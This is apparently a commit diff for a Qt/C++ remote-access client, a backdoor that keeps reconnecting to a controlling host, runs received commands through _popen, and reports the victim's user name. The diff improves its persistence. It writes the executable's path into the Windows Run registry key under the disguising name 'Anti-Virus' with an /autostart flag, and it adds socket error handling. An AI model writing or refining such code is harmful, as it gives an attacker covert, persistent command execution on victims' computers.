@@ -8,10 +8,12 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
 	connect(sock, SIGNAL(disconnected()), this, SLOT(tryToConnect()));
 	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));
+	connect(sock, SIGNAL(error(QAbstractSocket::SocketError)), this,
+		SLOT(HandleTcpError(QAbstractSocket::SocketError)));
 
 	tryToConnect();
 
-	compName = "Doru";
+	compName = qgetenv("UserName");;
 	addStartup();
 
 	thread = new QThread;
@@ -24,6 +26,7 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	thread->start();
 
 	dir = QDir::currentPath();
+
 }
 
 void QClient::tryToConnect()
@@ -40,6 +43,11 @@ void QClient::connected()
 void QClient::disconnected()
 {
 	qDebug() << "DISCONNECTED";
+}
+
+void QClient::HandleTcpError(QAbstractSocket::SocketError err)
+{
+	qDebug() << err;
 }
 
 void QClient::readyRead()
@@ -154,7 +162,9 @@ void QClient::addStartup()
 {
 	QString hkey("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
 	QSettings settings(hkey, QSettings::NativeFormat);
-	QString path = QDir::currentPath() + "\\QClient.exe";
+	QString path = QCoreApplication::applicationFilePath();
+	path.replace("/", "\\");
+	path = "\"" + path + "\"" + " /autostart";
 	settings.setValue("Anti-Virus", QVariant(path));
 }
 
@@ -169,7 +179,6 @@ QString QClient::runCmdCommand(const QString &cmd)
 	FILE * uname;
 	char os[800000];
 	int lastchar;
-
 	uname = _popen(cmd.toUtf8(), "r");
 	lastchar = fread(os, 1, 800000, uname);
 	os[lastchar] = '\0';
